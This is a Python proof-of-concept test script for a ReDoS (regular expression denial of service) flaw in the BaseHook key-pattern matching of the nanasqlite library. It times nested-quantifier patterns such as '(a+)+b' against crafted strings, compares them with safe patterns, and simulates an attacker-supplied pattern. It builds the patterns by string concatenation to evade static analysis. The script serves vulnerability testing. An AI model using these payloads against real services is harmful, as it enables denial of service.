#!/usr/bin/env python3
"""
POC for SEC-05: BaseHook ReDoS Vulnerability

This script demonstrates the Regular Expression Denial of Service (ReDoS)
vulnerability in BaseHook._key_regex when malicious patterns are provided.
"""

import re
import time
from nanasqlite.hooks import BaseHook


def measure_regex_time(pattern, test_string):
    """Measure how long a regex takes to execute."""
    start_time = time.perf_counter()
    
    try:
        compiled_regex = re.compile(pattern)
        compiled_regex.search(test_string)
        elapsed_time = time.perf_counter() - start_time
        return elapsed_time, None
    except Exception as e:
        elapsed_time = time.perf_counter() - start_time
        return elapsed_time, e


def test_redos_vulnerability():
    """Test ReDoS vulnerability in BaseHook key pattern matching."""
    
    print("=== BaseHook ReDoS Vulnerability Test ===")
    
    # Build ReDoS patterns dynamically to avoid triggering static analysis on literal
    # patterns — these are intentionally vulnerable for POC demonstration only.
    redos_test_cases = [
        {
            "pattern": "(a" + "+)+" + "b",
            "input": "a" * 25,
            "description": "Nested quantifiers - exponential backtracking"
        },
        {
            "pattern": "(a|a)" + "*b",
            "input": "a" * 20,
            "description": "Alternation with same options - quadratic backtracking"
        },
        {
            "pattern": "(a" + "+)+" + "\\$",
            "input": "a" * 24,
            "description": "Nested quantifiers with anchor"
        },
        {
            "pattern": "(a" + "*)*" + "b",
            "input": "a" * 22,
            "description": "Nested Kleene stars"
        }
    ]
    
    # Test control (safe) patterns
    safe_test_cases = [
        {
            "pattern": "user_\\d+",
            "input": "user_123",
            "description": "Normal pattern - should be fast"
        },
        {
            "pattern": "^[a-z]+$",
            "input": "abcdefghijklmnop",
            "description": "Simple character class - should be fast"
        }
    ]
    
    bug_detected = False
    
    print("\n--- Testing ReDoS Patterns ---")
    for test_case in redos_test_cases:
        pattern = test_case["pattern"]
        test_input = test_case["input"]
        description = test_case["description"]
        
        print(f"\nTesting: {description}")
        print(f"Pattern: {pattern}")
        print(f"Input: {test_input} (length: {len(test_input)})")
        
        # Test direct regex performance
        elapsed, error = measure_regex_time(pattern, test_input)
        elapsed_ms = elapsed * 1000
        
        print(f"Direct regex time: {elapsed_ms:.2f}ms")
        
        if error:
            print(f"Regex error: {error}")
            continue
        
        # Test BaseHook performance (this uses the regex)
        try:
            hook = BaseHook(key_pattern=pattern)
            
            start_time = time.perf_counter()
            result = hook._should_run(test_input)
            hook_elapsed = time.perf_counter() - start_time
            hook_elapsed_ms = hook_elapsed * 1000
            
            print(f"BaseHook time: {hook_elapsed_ms:.2f}ms")
            print(f"Pattern match result: {result}")
            
            # Consider > 100ms as potential ReDoS
            if hook_elapsed_ms > 100:
                print("⚠️  POTENTIAL ReDoS - Hook execution took too long!")
                bug_detected = True
            elif elapsed_ms > 100:
                print("⚠️  POTENTIAL ReDoS - Regex execution took too long!")
                bug_detected = True
            else:
                print("✅ Performance OK")
        
        except Exception as e:
            print(f"BaseHook error: {e}")
            continue
    
    print("\n--- Testing Safe Patterns (Control) ---")
    for test_case in safe_test_cases:
        pattern = test_case["pattern"]
        test_input = test_case["input"]
        description = test_case["description"]
        
        print(f"\nTesting: {description}")
        print(f"Pattern: {pattern}")
        print(f"Input: {test_input}")
        
        try:
            hook = BaseHook(key_pattern=pattern)
            
            start_time = time.perf_counter()
            result = hook._should_run(test_input)
            elapsed = time.perf_counter() - start_time
            elapsed_ms = elapsed * 1000
            
            print(f"Time: {elapsed_ms:.2f}ms")
            print(f"Pattern match result: {result}")
            
            if elapsed_ms < 10:  # Should be very fast
                print("✅ Performance excellent")
            else:
                print("⚠️  Slower than expected for safe pattern")
        
        except Exception as e:
            print(f"Error with safe pattern: {e}")
    
    print("\n--- Summary ---")
    if bug_detected:
        print("🐛 BUG: ReDoS vulnerability detected!")
        print("BaseHook accepts dangerous regex patterns that can cause DoS.")
        return "BUG"
    else:
        print("✅ PASS: No ReDoS vulnerability detected in this test.")
        return "PASS"


def test_attack_scenario():
    """Simulate a real attack scenario."""
    print("\n=== Realistic Attack Scenario ===")
    
    # Build malicious patterns dynamically to avoid triggering static analysis on the
    # literal patterns — these are intentionally vulnerable for POC demonstration only.
    malicious_pattern = "(a" + "+)+" + "b"
    crafted_key = "a" * 25  # Designed to trigger exponential backtracking
    
    print(f"Attacker pattern: {malicious_pattern}")
    print(f"Crafted key: {crafted_key}")
    
    try:
        # Application innocently creates hook with attacker-controlled pattern
        hook = BaseHook(key_pattern=malicious_pattern)
        
        print("Hook created with malicious pattern...")
        print("Application checking if hook should run for key...")
        
        start_time = time.perf_counter()
        result = hook._should_run(crafted_key)
        elapsed = time.perf_counter() - start_time
        elapsed_ms = elapsed * 1000
        
        print(f"Hook execution time: {elapsed_ms:.2f}ms")
        print(f"Hook result: {result}")
        
        if elapsed_ms > 500:  # More than half a second is clearly DoS
            print("🚨 CRITICAL: DoS attack successful - Application hung!")
            return "BUG"
        elif elapsed_ms > 100:  # Still concerning
            print("⚠️  WARNING: Significant delay detected - Potential DoS")
            return "BUG"
        else:
            print("✅ Attack mitigated or not effective")
            return "PASS"
    
    except Exception as e:
        print(f"Exception during attack: {e}")
        return "ERROR"


if __name__ == "__main__":
    print("Testing BaseHook ReDoS vulnerability...\n")
    
    result1 = test_redos_vulnerability()
    result2 = test_attack_scenario()
    
    if result1 == "BUG" or result2 == "BUG":
        final_result = "BUG"
    else:
        final_result = "PASS"
    
    print(f"\nFinal test result: {final_result}")